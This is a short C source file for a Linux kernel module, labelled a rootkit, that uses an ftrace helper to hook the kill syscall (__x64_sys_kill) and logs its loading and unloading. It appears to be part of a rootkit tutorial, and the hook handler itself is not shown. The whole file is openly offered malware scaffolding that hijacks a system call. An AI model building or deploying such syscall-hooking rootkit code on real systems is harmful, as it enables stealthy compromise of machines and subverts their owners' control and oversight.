#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

 

MODULE_LICENSE("");
MODULE_AUTHOR("");
MODULE_DESCRIPTION("");
MODULE_VERSION("");

/* Declare the struct that ftrace needs to hook the syscall */

static struct ftrace_hook hooks[] = {

HOOK("__x64_sys_kill", hook_kill, &orig_kill),

};

/* Module initialization function */

static int __init rootkit_init(void)
{

/* Hook the syscall and print to the kernel buffer */
int err;
err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
if(err)
return err;

printk(KERN_INFO "rootkit: Loaded >:-)\n");

return 0;
}

 

static void __exit rootkit_exit(void)
{

/* Unhook and restore the syscall and print to the kernel buffer */
fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
printk(KERN_INFO "rootkit: Unloaded :-(\n");

}

module_init(rootkit_init);
module_exit(rootkit_exit);